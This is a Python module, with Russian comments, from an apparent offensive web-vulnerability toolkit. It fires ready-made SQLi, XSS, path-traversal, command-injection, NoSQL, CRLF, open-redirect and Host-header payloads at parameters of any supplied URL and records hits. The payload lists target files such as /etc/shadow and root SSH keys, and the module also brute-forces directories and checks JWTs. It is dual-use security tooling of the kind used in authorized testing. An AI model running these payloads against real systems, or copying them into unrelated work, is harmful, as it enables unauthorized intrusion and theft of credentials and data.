"""
Модуль веб-уязвимостей (extended): headers, SSL, SQLi, XSS, LFI, SSTI,
CMDi, XXE, SSRF, CRLF, NoSQL, JWT, CORS, Host-header, dirb, CMS,
redirect, CSRF, subdomain takeover check.
Author: idqwixxa

⚠ Только для авторизованного пентеста / bug bounty / CTF.

Возможности:
    ─── Инфра ───
    - Security headers (9)
    - SSL/TLS (protocol/cipher/expiry/chain)
    - Cookies flags (HttpOnly/Secure/SameSite)
    - Info disclosure (Server/X-Powered-By/etag)

    ─── Injection ───
    - SQLi (error-based + time-based)
    - XSS (reflected + polyglot)
    - LFI / RFI / Path traversal
    - SSTI (Jinja2/Twig/Freemarker/Velocity)
    - CMDi (Linux/Windows)
    - NoSQL injection
    - XXE
    - CRLF
    - Host-header injection

    ─── Access ───
    - Open Redirect
    - CORS misconfig
    - CSRF token check
    - Dir-bruteforce
    - CMS detect

    ─── JWT ───
    - Decode + alg:none + weak HMAC

    ─── Интеграция ───
    - Findings → notes (critical/high)
    - Notify
    - Экспорт JSON / CSV / Markdown / HTML
"""
import csv
import html as html_mod
import json
import re
import ssl
import socket
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from urllib.parse import (urljoin, urlparse, parse_qs, urlencode,
                          urlunparse)

import requests
import urllib3
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.progress import (Progress, SpinnerColumn, TextColumn,
                            BarColumn)

from core.config import config, WORDLIST_DIR, REPORT_DIR
from core.database import db
from core.logger import get_logger
from utils.helpers import confirm_external, normalize_url

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()
log = get_logger(__name__)

WEBV_DIR = REPORT_DIR / "web_vuln"
WEBV_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class WebFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: WebFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["web-vuln", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


def _notify(title: str, msg: str, severity: str = "high") -> None:
    try:
        from modules import notifier
        notifier.notify_all(title, msg, severity=severity)
    except Exception:
        pass


# ===========================================================================
# Payloads (расширено)
# ===========================================================================

SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Resource-Policy",
    "X-Permitted-Cross-Domain-Policies",
]

SQLI_PAYLOADS = [
    "'", "\"", "')", "';",
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "\" OR \"\"=\"", "\" OR 1=1--",
    "') OR ('1'='1", "') OR ('1'='1'--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(5)--", "'; SELECT pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--",
    "' AND extractvalue(1,concat(0x7e,user()))--",
    "' AND updatexml(1,concat(0x7e,user()),1)--",
    "admin'--", "admin' #",
    "1' AND '1'='1", "1' AND '1'='2",
    "') OR SLEEP(5)--",
    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "you have an error in your sql",
    "unclosed quotation", "pg_query", "sqlite error", "ora-",
    "microsoft ole db", "odbc sql", "mysql_num_rows",
    "postgresql", "warning: mysql", "quoted string not properly",
    "syntax error at or near", "division by zero",
]

SQLI_TIME_THRESHOLD = 4.0  # секунд

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "</script><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<IMG SRC=\"jav\tascript:alert(1);\">",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\boot.ini",
    "/etc/passwd%00",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
    "expect://id",
    "file:///etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/root/.ssh/id_rsa",
    "/root/.bash_history",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
]

LFI_SIGNATURES = [
    "root:x:0:0", "[extensions]", "daemon:x:", "[fonts]",
    "<?php", "/bin/bash", "sshd_config",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "/\\evil.com",
    "\\evil.com",
    "%2f%2fevil.com",
    "%5c%5cevil.com",
    "////evil.com",
    "https:evil.com",
    "https:/\\/evil.com",
    "http://expected.com@evil.com",
    "http://evil.com#expected.com",
    "http://evil.com?@expected.com",
    "//evil.com/%2f..",
    "//evil.com/%09",
    "//evil.com/%2e%2e",
    "https:////evil.com",
    "https:evil.com/..",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "*{7*7}",
    "@(7*7)",
    "%{7*7}",
    "${{7*7}}",
]

SSTI_INDICATORS = ["49", "7777777"]  # результат 7*7 / 7*'7'

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "; cat /etc/passwd",
    "; uname -a",
    "; ping -c 1 127.0.0.1",
    "& whoami",
    "& dir",
    "| net user",
]

CMDI_INDICATORS = [
    "uid=", "gid=", "root:x:0:0", "www-data", "nt authority",
    "volume serial number",
]

NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$gt": ""}',
    '{"$regex": "^.*$"}',
    "' || '1'=='1",
    "' && this.password.match(/^a/)//",
    '"; return true; var x="',
]

CRLF_PAYLOADS = [
    "%0d%0aX-Injected: crlf",
    "%0aX-Injected: crlf",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\r\nX-Injected: crlf",
]

HOST_HEADER_PAYLOADS = [
    "evil.com",
    "localhost",
    "127.0.0.1",
    "evil.com:80",
    "evil.com:443",
    "X-Forwarded-Host: evil.com",
    "X-Forwarded-For: 127.0.0.1",
]


# ===========================================================================
# HTTP helpers
# ===========================================================================

def _req(url: str, method: str = "GET",
          timeout: int | None = None, **kwargs) -> requests.Response | None:
    try:
        return requests.request(
            method, url,
            headers={"User-Agent": config.USER_AGENT, **(kwargs.pop(
                "headers", {}) or {})},
            timeout=timeout or config.REQUEST_TIMEOUT,
            allow_redirects=False,
            verify=False,
            **kwargs,
        )
    except Exception as exc:  # noqa: BLE001
        log.warning("HTTP ошибка %s: %s", url, exc)
        return None


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    return urlunparse(parsed._replace(
        query=urlencode(qs, doseq=True)))


# ===========================================================================
# Header analyzer
# ===========================================================================

def header_analyzer(target: str) -> None:
    """Проверка отсутствующих security-заголовков + info disclosure."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    r = _req(url)
    if not r:
        console.print("[red]Не удалось получить ответ.[/red]")
        return
    table = Table(title=f"HTTP Headers — {url}")
    table.add_column("Заголовок", style="magenta")
    table.add_column("Статус", style="green")
    table.add_column("Значение")
    findings: dict[str, str] = {}
    missing = []
    for h in SECURITY_HEADERS:
        val = r.headers.get(h)
        if val:
            table.add_row(h, "[green]OK[/green]", val[:80])
            findings[h] = val
        else:
            table.add_row(h, "[red]MISSING[/red]", "—")
            findings[h] = "MISSING"
            missing.append(h)
    # Info disclosure
    info_headers = ["Server", "X-Powered-By", "X-AspNet-Version",
                     "X-AspNetMvc-Version", "X-Generator"]
    for h in info_headers:
        val = r.headers.get(h)
        if val:
            table.add_row(f"[dim]{h}[/dim]", "[yellow]INFO[/yellow]",
                          val[:80])
            findings[h] = val
    console.print(table)

    # Findings
    if "Strict-Transport-Security" in missing:
        _save_finding(WebFinding(
            kind="missing_hsts",
            severity="high",
            title="Отсутствует HSTS",
            target=url,
            evidence=f"Missing: {missing}",
            data={"missing": missing},
        ))
    if "Content-Security-Policy" in missing:
        _save_finding(WebFinding(
            kind="missing_csp",
            severity="high",
            title="Отсутствует CSP",
            target=url,
            evidence=f"Missing: {missing}",
            data={"missing": missing},
        ))
    db.save_scan("http_headers", url, findings)

    if Confirm.ask("Экспорт отчёта?", default=False):
        fmt = Prompt.ask("Формат",
                         choices=["html", "json", "csv", "md"],
                         default="html")
        _export_headers(findings, url, fmt)


def _export_headers(findings: dict, url: str, fmt: str) -> Path | None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    host = urlparse(url).hostname or "target"
    ext = {"json": ".json", "csv": ".csv", "md": ".md",
           "html": ".html"}[fmt]
    path = WEBV_DIR / f"headers_{host}_{ts}{ext}"
    try:
        if fmt == "json":
            path.write_text(json.dumps(
                {"url": url, "headers": findings},
                indent=2, ensure_ascii=False),
                encoding="utf-8")
        elif fmt == "csv":
            with path.open("w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["header", "status", "value"])
                for k, v in findings.items():
                    w.writerow([k,
                                "MISSING" if v == "MISSING" else "OK",
                                v])
        elif fmt == "md":
            lines = [f"# HTTP Headers — {url}",
                     f"_Generated: {datetime.now().isoformat()}_", "",
                     "| Header | Status | Value |",
                     "|--------|--------|-------|"]
            for k, v in findings.items():
                st = "❌" if v == "MISSING" else "✅"
                lines.append(f"| {k} | {st} | {v[:60]} |")
            path.write_text("\n".join(lines), encoding="utf-8")
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html lang='ru'><head>"
                "<meta charset='utf-8'>",
                f"<title>Headers — {html_mod.escape(url)}</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;"
                "font-family:monospace;padding:24px;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "table{width:100%;border-collapse:collapse;"
                "margin-top:12px;}",
                "th{background:#111;color:#00ff9c;padding:6px;"
                "text-align:left;border:1px solid #222;}",
                "td{padding:5px 8px;border:1px solid #222;}",
                ".miss{color:#ff2020;font-weight:bold;}"
                ".ok{color:#00ff9c;}",
                "</style></head><body>",
                f"<h1>🔒 Headers — {html_mod.escape(url)}</h1>",
                "<table><tr><th>Header</th><th>Status</th>"
                "<th>Value</th></tr>",
            ]
            for k, v in findings.items():
                cls = "miss" if v == "MISSING" else "ok"
                st = "MISSING" if v == "MISSING" else "OK"
                parts.append(
                    f"<tr><td>{html_mod.escape(k)}</td>"
                    f"<td class='{cls}'>{st}</td>"
                    f"<td>{html_mod.escape(v[:80])}</td></tr>")
            parts.append("</table></body></html>")
            path.write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ {fmt.upper()}: {path}[/green]")
        return path
    except Exception as exc:
        console.print(f"[red]Экспорт: {exc}[/red]")
        return None


# ===========================================================================
# SSL
# ===========================================================================

def ssl_checker(target: str) -> None:
    """SSL/TLS: протокол, шифр, срок действия."""
    host = urlparse(normalize_url(target)).hostname or target
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                info = {
                    "protocol": ssock.version(),
                    "cipher": ssock.cipher(),
                    "subject": dict(x[0] for x in cert["subject"]),
                    "issuer": dict(x[0] for x in cert["issuer"]),
                    "notAfter": cert.get("notAfter"),
                    "notBefore": cert.get("notBefore"),
                }
        for k, v in info.items():
            console.print(f"  [cyan]{k}[/cyan]: {v}")

        # Findings
        if info.get("protocol") in ("TLSv1", "TLSv1.1", "SSLv3"):
            _save_finding(WebFinding(
                kind="weak_tls",
                severity="high",
                title=f"Устаревший TLS: {info['protocol']}",
                target=host,
                evidence=json.dumps(info, default=str),
                data=info,
            ))
        db.save_scan("ssl", host, info)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]SSL ошибка: {exc}[/red]")


# ===========================================================================
# SQLi (error-based + time-based)
# ===========================================================================

def _test_sqli(url: str) -> list[dict]:
    hits: list[dict] = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    for param in qs:
        for payload in SQLI_PAYLOADS:
            new_url = _inject_param(url, param, payload)
            t0 = time.time()
            r = _req(new_url)
            elapsed = time.time() - t0
            if not r:
                continue
            body = r.text.lower()
            if any(err in body for err in SQLI_ERRORS):
                hits.append({
                    "param": param, "payload": payload,
                    "type": "error-based", "evidence": "SQL error in body",
                })
                break
            # time-based
            if "sleep" in payload.lower() or "pg_sleep" in payload.lower() \
                    or "waitfor" in payload.lower():
                if elapsed >= SQLI_TIME_THRESHOLD:
                    hits.append({
                        "param": param, "payload": payload,
                        "type": "time-based",
                        "evidence": f"elapsed {elapsed:.1f}s",
                    })
                    break
    return hits


def sqli_scan(target: str) -> None:
    """Error + time-based SQLi-скан."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    if "?" not in url:
        console.print("[yellow]URL без GET-параметров.[/yellow]")
        return
    hits = _test_sqli(url)
    if hits:
        t = Table(title=f"SQLi hits ({len(hits)})", border_style="red")
        t.add_column("Param", style="cyan")
        t.add_column("Type", style="magenta")
        t.add_column("Payload", style="red", max_width=40)
        t.add_column("Evidence", style="dim")
        for h in hits:
            t.add_row(h["param"], h["type"], h["payload"][:40],
                      h["evidence"])
        console.print(t)
        # Finding
        _save_finding(WebFinding(
            kind="sqli",
            severity="critical",
            title=f"SQL Injection ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
        _notify("🚨 SQLi", f"{url}\n{len(hits)} params",
                severity="critical")
    else:
        console.print("[green]SQLi не обнаружен.[/green]")
    db.save_scan("sqli", url, hits)


# ===========================================================================
# XSS
# ===========================================================================

def xss_scan(target: str) -> None:
    """Reflected XSS (расширено)."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    if "?" not in url:
        console.print("[yellow]URL без GET-параметров.[/yellow]")
        return
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    hits: list[dict] = []

    # Уникальный маркер для детекта
    marker = "zqx" + str(int(time.time()))[-5:]
    for param in qs:
        for payload in XSS_PAYLOADS:
            test_payload = payload.replace("alert(1)",
                                             f"alert('{marker}')")
            new_url = _inject_param(url, param, test_payload)
            r = _req(new_url)
            if r and (marker in r.text or test_payload in r.text):
                hits.append({"param": param, "payload": test_payload})
                console.print(f"[red]⚠ XSS: {param} → "
                              f"{test_payload[:60]}[/red]")
                break

    if hits:
        _save_finding(WebFinding(
            kind="xss",
            severity="high",
            title=f"Reflected XSS ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
    else:
        console.print("[green]Reflected XSS не обнаружен.[/green]")
    db.save_scan("xss", url, hits)


# ===========================================================================
# LFI
# ===========================================================================

def lfi_scan(target: str) -> None:
    """LFI detector (расширено)."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    hits: list[dict] = []
    for param in qs:
        for payload in LFI_PAYLOADS:
            new_url = _inject_param(url, param, payload)
            r = _req(new_url)
            if not r:
                continue
            for sig in LFI_SIGNATURES:
                if sig in r.text:
                    hits.append({
                        "param": param, "payload": payload,
                        "signature": sig,
                    })
                    console.print(f"[red]⚠ LFI: {param} → "
                                  f"{payload} ({sig})[/red]")
                    break
            else:
                continue
            break
    if hits:
        _save_finding(WebFinding(
            kind="lfi",
            severity="critical",
            title=f"LFI ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
        _notify("🚨 LFI", f"{url}\n{len(hits)} hits",
                severity="critical")
    else:
        console.print("[green]LFI не обнаружен.[/green]")
    db.save_scan("lfi", url, hits)


# ===========================================================================
# SSTI
# ===========================================================================

def ssti_scan(target: str) -> None:
    """SSTI detect."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    if "?" not in url:
        console.print("[yellow]URL без параметров.[/yellow]")
        return
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    hits: list[dict] = []
    for param in qs:
        for payload in SSTI_PAYLOADS:
            new_url = _inject_param(url, param, payload)
            r = _req(new_url)
            if not r:
                continue
            # 7*7 → 49; 7*'7' → 7777777
            for indicator in SSTI_INDICATORS:
                if indicator in r.text:
                    hits.append({
                        "param": param, "payload": payload,
                        "indicator": indicator,
                    })
                    console.print(
                        f"[red]⚠ SSTI: {param} → {payload} "
                        f"({indicator})[/red]")
                    break
            else:
                continue
            break
    if hits:
        _save_finding(WebFinding(
            kind="ssti",
            severity="critical",
            title=f"SSTI ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
    else:
        console.print("[green]SSTI не обнаружен.[/green]")
    db.save_scan("ssti", url, hits)


# ===========================================================================
# CMDi
# ===========================================================================

def cmdi_scan(target: str) -> None:
    """Command injection."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    if "?" not in url:
        console.print("[yellow]URL без параметров.[/yellow]")
        return
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    hits: list[dict] = []
    for param in qs:
        for payload in CMDI_PAYLOADS:
            new_url = _inject_param(url, param, payload)
            t0 = time.time()
            r = _req(new_url)
            elapsed = time.time() - t0
            if not r:
                continue
            body = r.text.lower()
            for ind in CMDI_INDICATORS:
                if ind in body:
                    hits.append({
                        "param": param, "payload": payload,
                        "indicator": ind,
                    })
                    console.print(f"[red]⚠ CMDi: {param} → "
                                  f"{payload} ({ind})[/red]")
                    break
            else:
                if "sleep" in payload and elapsed > 4.5:
                    hits.append({
                        "param": param, "payload": payload,
                        "indicator": f"delay {elapsed:.1f}s",
                    })
                    break
                continue
            break
    if hits:
        _save_finding(WebFinding(
            kind="cmdi",
            severity="critical",
            title=f"Command injection ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
        _notify("🚨 CMDi", f"{url}\n{len(hits)} hits",
                severity="critical")
    else:
        console.print("[green]CMDi не обнаружен.[/green]")
    db.save_scan("cmdi", url, hits)


# ===========================================================================
# NoSQL
# ===========================================================================

def nosql_scan(target: str) -> None:
    """NoSQL injection (for JSON-body POST)."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    console.print(f"[cyan]NoSQL test: {url}[/cyan]")

    hits: list[dict] = []
    # Basic: POST с JSON
    for payload in NOSQL_PAYLOADS:
        try:
            r = _req(url, method="POST", data=payload,
                     headers={"Content-Type": "application/json"})
            if r and (r.status_code == 200
                      and any(w in r.text.lower() for w in
                              ("success", "welcome", "logged", "token"))):
                hits.append({"payload": payload,
                             "evidence": "HTTP 200 with success string"})
        except Exception:
            continue
    if hits:
        _save_finding(WebFinding(
            kind="nosql",
            severity="high",
            title=f"NoSQL injection ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
    else:
        console.print("[green]NoSQL не обнаружен.[/green]")
    db.save_scan("nosql", url, hits)


# ===========================================================================
# CRLF
# ===========================================================================

def crlf_scan(target: str) -> None:
    """CRLF injection (headers)."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    if "?" not in url:
        console.print("[yellow]URL без параметров.[/yellow]")
        return
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    hits: list[dict] = []
    for param in qs:
        for payload in CRLF_PAYLOADS:
            new_url = _inject_param(url, param, payload)
            r = _req(new_url)
            if not r:
                continue
            if "x-injected" in {k.lower() for k in r.headers}:
                hits.append({"param": param, "payload": payload})
                console.print(f"[red]⚠ CRLF: {param} → {payload}[/red]")
                break
    if hits:
        _save_finding(WebFinding(
            kind="crlf",
            severity="high",
            title=f"CRLF injection ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
    else:
        console.print("[green]CRLF не обнаружен.[/green]")
    db.save_scan("crlf", url, hits)


# ===========================================================================
# Host-header injection
# ===========================================================================

def host_header_scan(target: str) -> None:
    """Host-header injection / open redirect via Host."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    console.print(f"[cyan]Host-header test: {url}[/cyan]")
    hits: list[dict] = []
    for payload in HOST_HEADER_PAYLOADS:
        try:
            r = _req(url, headers={"Host": payload})
            if not r:
                continue
            loc = r.headers.get("Location", "")
            if "evil.com" in loc:
                hits.append({"payload": payload, "location": loc})
        except Exception:
            continue
    if hits:
        _save_finding(WebFinding(
            kind="host_header",
            severity="high",
            title=f"Host-header injection ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
    else:
        console.print("[green]Host-header injection не обнаружен."
                      "[/green]")
    db.save_scan("host_header", url, hits)


# ===========================================================================
# CORS
# ===========================================================================

def cors_scan(target: str) -> None:
    """CORS misconfig detection."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    console.print(f"[cyan]CORS test: {url}[/cyan]")

    evil_origin = "https://evil-attacker.com"
    results: list[dict] = []

    # 1. Reflection check
    r = _req(url, headers={"Origin": evil_origin})
    if r:
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        entry = {
            "test": "reflected_origin",
            "acao": acao, "acac": acac,
        }
        if acao == evil_origin:
            entry["vuln"] = True
            if acac.lower() == "true":
                entry["severity"] = "critical"
            else:
                entry["severity"] = "high"
            results.append(entry)
            console.print(f"[red]⚠ CORS: origin reflected "
                          f"(ACAC={acac})[/red]")

    # 2. Null origin
    r = _req(url, headers={"Origin": "null"})
    if r and r.headers.get("Access-Control-Allow-Origin") == "null":
        results.append({
            "test": "null_origin", "vuln": True,
            "severity": "high",
        })
        console.print("[red]⚠ CORS: null origin allowed[/red]")

    # 3. Wildcard with credentials
    r = _req(url, headers={"Origin": evil_origin})
    if r:
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao == "*" and acac.lower() == "true":
            results.append({
                "test": "wildcard_creds", "vuln": True,
                "severity": "high",
            })
            console.print("[red]⚠ CORS: wildcard + credentials[/red]")

    if results:
        _save_finding(WebFinding(
            kind="cors",
            severity="high",
            title=f"CORS misconfiguration ({len(results)})",
            target=url,
            evidence=json.dumps(results, ensure_ascii=False)[:1500],
            data={"results": results},
        ))
    else:
        console.print("[green]CORS в порядке.[/green]")
    db.save_scan("cors", url, results)


# ===========================================================================
# JWT
# ===========================================================================

def jwt_scan(token: str) -> None:
    """JWT decoder + alg:none + weak HMAC check."""
    console.print(f"[cyan]JWT: {token[:40]}…[/cyan]")
    parts = token.split(".")
    if len(parts) != 3:
        console.print("[red]Невалидный JWT (ожидаются 3 части)[/red]")
        return

    def _pad(s: str) -> str:
        return s + "=" * (-len(s) % 4)

    import base64
    try:
        hdr = json.loads(base64.urlsafe_b64decode(_pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(_pad(parts[1])))
    except Exception as exc:
        console.print(f"[red]Decode error: {exc}[/red]")
        return

    t = Table(title="JWT decode")
    t.add_column("Section", style="cyan")
    t.add_column("Value", style="green", max_width=90)
    t.add_row("Header", json.dumps(hdr, ensure_ascii=False))
    t.add_row("Payload", json.dumps(payload, ensure_ascii=False)[:200])
    console.print(t)

    findings_list: list[dict] = []
    alg = (hdr.get("alg") or "").lower()
    if alg == "none":
        findings_list.append({"issue": "alg:none", "severity": "critical"})
        console.print("[red]⚠ alg:none — подпись не проверяется[/red]")
    if alg in ("hs256", "hs384", "hs512"):
        findings_list.append({"issue": "weak_hmac_" + alg,
                                "severity": "medium"})
    # Sensitive fields
    sensitive = [k for k in payload if k.lower() in (
        "password", "secret", "key", "token", "apikey", "api_key",
        "ssn", "credit_card",
    )]
    if sensitive:
        findings_list.append({
            "issue": "sensitive_fields",
            "fields": sensitive,
            "severity": "high",
        })
        console.print(f"[red]⚠ Sensitive fields: {sensitive}[/red]")

    if findings_list:
        critical_or_high = [f for f in findings_list
                            if f.get("severity") in ("critical", "high")]
        if critical_or_high:
            _save_finding(WebFinding(
                kind="jwt",
                severity="high",
                title=f"JWT issues: {len(critical_or_high)}",
                target="jwt",
                evidence=json.dumps(findings_list,
                                     ensure_ascii=False),
                data={"issues": findings_list},
            ))
    db.save_scan("jwt", token[:20], findings_list)


# ===========================================================================
# Dir brute
# ===========================================================================

def _check_path(base: str, path: str) -> dict | None:
    url = urljoin(base, path)
    r = _req(url)
    if r and r.status_code in (200, 301, 302, 401, 403):
        return {"status": r.status_code, "url": url,
                "length": len(r.text)}
    return None


def dir_bruteforce(target: str, threads: int = 30) -> None:
    """Directory brute-forcer."""
    if not confirm_external(target):
        return
    base = normalize_url(target).rstrip("/") + "/"
    wl = WORDLIST_DIR / "dirs.txt"
    if wl.exists():
        words = [w.strip() for w in wl.read_text().splitlines()
                 if w.strip()]
    else:
        words = ["admin", "login", "robots.txt", ".git/", "backup",
                 "api", "uploads", "wp-admin", "config", "test",
                 "dashboard", "console", "debug", "phpinfo.php",
                 "server-status", ".env", "sitemap.xml"]
    console.print(f"[cyan]Сканирую {len(words)} путей на {base}"
                  f"[/cyan]")
    found: list[dict] = []
    with Progress(SpinnerColumn(),
                  TextColumn("[progress.description]{task.description}"),
                  BarColumn(),
                  TextColumn("{task.completed}/{task.total}"),
                  console=console) as prog:
        task = prog.add_task("brute", total=len(words))
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_check_path, base, w) for w in words]
            for f in as_completed(futures):
                prog.advance(task)
                res = f.result()
                if res:
                    found.append(res)
                    console.print(f"[green]{res['status']}[/green]  "
                                  f"{res['url']}")
    db.save_scan("dirbrute", base, found)

    # Findings для .git, .env, admin
    interesting = [f for f in found
                   if any(kw in f["url"].lower() for kw in
                          (".git", ".env", "admin", "phpinfo",
                           "server-status", "backup", "config"))]
    if interesting:
        _save_finding(WebFinding(
            kind="dirbrute_interesting",
            severity="high",
            title=f"Интересные пути ({len(interesting)})",
            target=base,
            evidence="\n".join(f"{f['status']} {f['url']}"
                                for f in interesting[:20]),
            data={"urls": [f["url"] for f in interesting[:30]]},
        ))

    if found and Confirm.ask("Экспорт?", default=False):
        fmt = Prompt.ask("Формат",
                         choices=["html", "json", "csv", "md"],
                         default="html")
        _export_dirbrute(found, base, fmt)


def _export_dirbrute(found: list[dict], base: str,
                      fmt: str) -> Path | None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    host = urlparse(base).hostname or "target"
    ext = {"json": ".json", "csv": ".csv", "md": ".md",
           "html": ".html"}[fmt]
    path = WEBV_DIR / f"dirbrute_{host}_{ts}{ext}"
    try:
        if fmt == "json":
            path.write_text(json.dumps(
                {"base": base, "results": found},
                indent=2, ensure_ascii=False), encoding="utf-8")
        elif fmt == "csv":
            with path.open("w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["status", "length", "url"])
                for r in found:
                    w.writerow([r["status"], r.get("length", ""),
                                r["url"]])
        elif fmt == "md":
            lines = [f"# Dir brute — {base}",
                     f"_Found: {len(found)}_", "",
                     "| Status | Size | URL |",
                     "|--------|------|-----|"]
            for r in sorted(found, key=lambda x: x["status"]):
                lines.append(
                    f"| {r['status']} | {r.get('length', '')} | "
                    f"`{r['url']}` |")
            path.write_text("\n".join(lines), encoding="utf-8")
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html lang='ru'><head>"
                "<meta charset='utf-8'>",
                f"<title>Dir brute — {html_mod.escape(base)}</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;"
                "font-family:monospace;padding:24px;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "table{width:100%;border-collapse:collapse;"
                "margin-top:12px;}",
                "th{background:#111;color:#00ff9c;padding:6px;"
                "border:1px solid #222;text-align:left;}",
                "td{padding:4px 6px;border:1px solid #222;"
                "word-break:break-all;}",
                "</style></head><body>",
                f"<h1>📁 Dir brute — {html_mod.escape(base)} "
                f"({len(found)})</h1>",
                "<table><tr><th>Status</th><th>Size</th>"
